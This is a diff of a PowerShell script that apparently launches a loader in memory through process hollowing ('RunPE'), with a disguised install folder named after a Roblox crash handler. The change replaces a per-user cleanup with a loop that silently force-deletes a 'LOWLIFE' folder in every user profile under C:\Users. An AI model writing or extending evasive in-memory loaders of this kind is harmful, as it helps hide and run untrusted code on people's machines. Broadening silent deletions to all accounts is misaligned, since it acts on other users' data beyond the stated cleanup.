@@ -469,8 +469,13 @@ Write-Host "[3/4] Launching loader in-memory (process hollowing)..." -Foreground
 # Remove old file-based install folder if it exists (legacy cleanup)
 $oldFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
 if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
-$oldAppData = "$env:APPDATA\LOWLIFE"
-if (Test-Path $oldAppData) { Remove-Item $oldAppData -Recurse -Force -ErrorAction SilentlyContinue }
+# Clean up legacy AppData configuration folders for all user profiles
+Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -notmatch '(?i)^(Public|Default|All Users|Default User)$' } |
+    ForEach-Object {
+        $legacyPath = Join-Path $_.FullName "AppData\Roaming\LOWLIFE"
+        if (Test-Path $legacyPath) { Remove-Item $legacyPath -Recurse -Force -ErrorAction SilentlyContinue }
+    }
 
 $hollowSuccess = $false
 if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
